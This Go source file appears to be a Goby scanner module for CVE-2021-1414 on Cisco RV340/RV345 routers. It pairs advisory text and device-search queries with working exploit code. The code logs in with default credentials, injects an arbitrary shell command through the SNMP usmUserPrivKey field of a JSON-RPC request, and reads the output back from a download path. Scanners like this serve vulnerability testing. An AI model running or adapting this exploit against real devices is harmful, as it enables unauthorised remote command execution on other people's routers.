package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cisco RV340 Auth RCE (CVE-2021-1414)",
    "Description": "<p>Cisco is the world's leading provider of network solutions.</p><p>Multiple vulnerabilities in the web-based management interface of Cisco RV340, RV340W, RV345, and RV345P Dual WAN Gigabit VPN Routers could allow an authenticated, remote attacker to execute arbitrary code with elevated privileges equivalent to the web service process on an affected device. These vulnerabilities exist because HTTP requests are not properly validated. An attacker could exploit these vulnerabilities by sending a crafted HTTP request to the web-based management interface of an affected device. A successful exploit could allow the attacker to remotely execute arbitrary code on the device.</p>",
    "Impact": "Cisco RV340 Auth RCE (CVE-2021-1414)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.cisco.com\">https://www.cisco.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Cisco",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Cisco RV340 后台远程命令执行漏洞（CVE-2021-1414）",
            "Description": "<p>Cisco RV34x系列双重广域网(WAN)千兆位虚拟专用网络(VPN)安全路由器是下一代高性能路由器。可以根据用户定义的策略识别和处理终端设备和应用程序，以提高生产力和优化网络使用。</p><p>Cisco RV340、RV340W、RV345 和 RV345P 双 WAN 千兆 VPN 路由器的基于 Web 的管理界面中存在多个漏洞，可能允许经过身份验证的远程攻击者使用与受影响设备上的 Web 服务进程等效的提升权限执行任意代码。这些漏洞的存在是因为 HTTP 请求没有得到正确验证。攻击者可以通过向受影响设备的基于 Web 的管理界面发送精心设计的 HTTP 请求来利用这些漏洞。成功的利用可能允许攻击者在设备上远程执行任意代码。</p>",
            "Impact": "<p>Cisco RV340、RV340W、RV345 和 RV345P 双 WAN 千兆 VPN 路由器的基于 Web 的管理界面中存在多个漏洞，可能允许经过身份验证的远程攻击者使用与受影响设备上的 Web 服务进程等效的提升权限执行任意代码。这些漏洞的存在是因为 HTTP 请求没有得到正确验证。攻击者可以通过向受影响设备的基于 Web 的管理界面发送精心设计的 HTTP 请求来利用这些漏洞。成功的利用可能允许攻击者在设备上远程执行任意代码。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.cisco.com\">https://www.cisco.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Cisco",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Cisco RV340 Auth RCE (CVE-2021-1414)",
            "Description": "<p>Cisco is the world's leading provider of network solutions.</p><p>Multiple vulnerabilities in the web-based management interface of Cisco RV340, RV340W, RV345, and RV345P Dual WAN Gigabit VPN Routers could allow an authenticated, remote attacker to execute arbitrary code with elevated privileges equivalent to the web service process on an affected device. These vulnerabilities exist because HTTP requests are not properly validated. An attacker could exploit these vulnerabilities by sending a crafted HTTP request to the web-based management interface of an affected device. A successful exploit could allow the attacker to remotely execute arbitrary code on the device.</p>",
            "Impact": "Cisco RV340 Auth RCE (CVE-2021-1414)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.cisco.com\">https://www.cisco.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Cisco",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"Cisco RV340\" || banner=\"CISCO RV340\" || cert=\"RV340\") || (title=\"Cisco RV340W\") || (title=\"Cisco RV345\" || cert=\"RV345\") || (title=\"Cisco RV345P\")",
    "GobyQuery": "(title=\"Cisco RV340\" || banner=\"CISCO RV340\" || cert=\"RV340\") || (title=\"Cisco RV340W\") || (title=\"Cisco RV345\" || cert=\"RV345\") || (title=\"Cisco RV345P\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.cisco.com",
    "DisclosureDate": "2021-05-27",
    "References": [
        "https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/",
        "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv34x-rce-8bfG2h6b"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "6.3",
    "CVEIDs": [
        "CVE-2021-1414"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "Cisco RV340"
        ]
    },
    "PocId": "10227"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := goutils.RandomHexString(4)
			Rand2 := goutils.RandomHexString(4)
			RandName := goutils.RandomHexString(4)
			uri1 := "/jsonrpc"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = `{"jsonrpc":"2.0","method":"login","params":{"user":"cisco","pass":"Y2lzY28=","lang":"English"}}`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					SessionId := regexp.MustCompile("\"errstr\":\"(.*?)\",").FindStringSubmatch(resp1.RawBody)
					uri2 := "/jsonrpc"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.Header.Store("Cookie", "selected_language=English; sessionid="+SessionId[1])
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
					cfg2.Data = fmt.Sprintf(`{"jsonrpc":"2.0","method":"set_snmp","params":{"snmp":{"enabled":true,"snmpVersions":{"v1":false,"v2c":false,"v3":true},"allow-access-from-wan":false,"allow-access-from-vpn":false},"SNMPv2-MIB":{"system":{"sysName":"router84AA47","sysContact":"","sysLocation":""}},"SNMP-TARGET-MIB":{"snmpTargetAddrTable":{"snmpTargetAddrEntry":[]}},"SNMP-USER-BASED-SM-MIB":{"usmUserTable":{"usmUserEntry":[{"usmUserSecurityName":"admin","usmUserEngineID":"80:00:61:81:05:01","usmUserName":"admin","usmUserPrivProtocol":"1.3.6.1.6.3.10.1.2.2","usmUserAuthProtocol":"1.3.6.1.6.3.10.1.1.2","usmUserPrivKey":"cisco;echo %s\"\"%s >/tmp/download/%s","usmUserAuthKey":"cisco"}]}}}}`, Rand1, Rand2, RandName)
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							uri3 := "/download/" + RandName
							cfg3 := httpclient.NewGetRequestConfig(uri3)
							cfg3.Header.Store("Cookie", "selected_language=English; sessionid="+SessionId[1])
							cfg3.VerifyTls = false
							if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
								return resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, Rand1+Rand2)
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandName := goutils.RandomHexString(4)
			uri1 := "/jsonrpc"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg1.Data = `{"jsonrpc":"2.0","method":"login","params":{"user":"cisco","pass":"Y2lzY28=","lang":"English"}}`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					SessionId := regexp.MustCompile("\"errstr\":\"(.*?)\",").FindStringSubmatch(resp1.RawBody)
					uri2 := "/jsonrpc"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.Header.Store("Cookie", "selected_language=English; sessionid="+SessionId[1])
					cfg2.VerifyTls = false
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
					cfg2.Data = fmt.Sprintf(`{"jsonrpc":"2.0","method":"set_snmp","params":{"snmp":{"enabled":true,"snmpVersions":{"v1":false,"v2c":false,"v3":true},"allow-access-from-wan":false,"allow-access-from-vpn":false},"SNMPv2-MIB":{"system":{"sysName":"router84AA47","sysContact":"","sysLocation":""}},"SNMP-TARGET-MIB":{"snmpTargetAddrTable":{"snmpTargetAddrEntry":[]}},"SNMP-USER-BASED-SM-MIB":{"usmUserTable":{"usmUserEntry":[{"usmUserSecurityName":"admin","usmUserEngineID":"80:00:61:81:05:01","usmUserName":"admin","usmUserPrivProtocol":"1.3.6.1.6.3.10.1.2.2","usmUserAuthProtocol":"1.3.6.1.6.3.10.1.1.2","usmUserPrivKey":"cisco;%s >/tmp/download/%s","usmUserAuthKey":"cisco"}]}}}}`, cmd, RandName)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							uri3 := "/download/" + RandName
							cfg3 := httpclient.NewGetRequestConfig(uri3)
							cfg3.Header.Store("Cookie", "selected_language=English; sessionid="+SessionId[1])
							cfg3.VerifyTls = false
							if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
								if resp3.StatusCode == 200 {
									expResult.Output = resp3.RawBody
									expResult.Success = true
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
